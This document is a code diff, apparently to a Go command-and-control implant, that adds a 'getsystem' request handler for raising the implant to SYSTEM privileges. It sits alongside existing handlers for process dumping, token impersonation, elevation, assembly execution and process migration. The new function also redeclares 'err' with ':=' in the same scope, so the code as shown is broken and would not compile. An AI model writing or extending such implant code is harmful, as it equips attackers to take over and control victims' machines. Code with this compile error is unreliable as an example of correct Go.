@@ -19,13 +19,14 @@ var (
 		pb.MsgRemoteTask:         remoteTaskHandler,
 		pb.MsgProcessDumpReq:     dumpHandler,
 		pb.MsgImpersonateReq:     impersonateHandler,
+		pb.MsgGetSystemReq:       getsystemHandler,
 		pb.MsgElevateReq:         elevateHandler,
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 		pb.MsgMigrateReq:         migrateHandler,
 
 		// Generic
-		pb.MsgPsReq: psHandler,
-		pb.MsgPing:  pingHandler,
+		pb.MsgPsReq:       psHandler,
+		pb.MsgPing:        pingHandler,
 		pb.MsgLsReq:       dirListHandler,
 		pb.MsgDownloadReq: downloadHandler,
 		pb.MsgUploadReq:   uploadHandler,
@@ -60,6 +61,24 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 		Output: out,
 	}
 	data, err = proto.Marshal(impersonate)
+	resp(data, err)
+}
+
+func getsystemHandler(data []byte, resp RPCResponse) {
+	gsReq := &pb.GetSystemReq{}
+	err := proto.Unmarshal(data, gsReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	err := priv.GetSystem(gsReq.Data)
+	gsResp := &pb.GetSystem{}
+	if err != nil {
+		gsResp.Output = err.Error()
+	}
+	data, err = proto.Marshal(gsResp)
 	resp(data, err)
 }
 
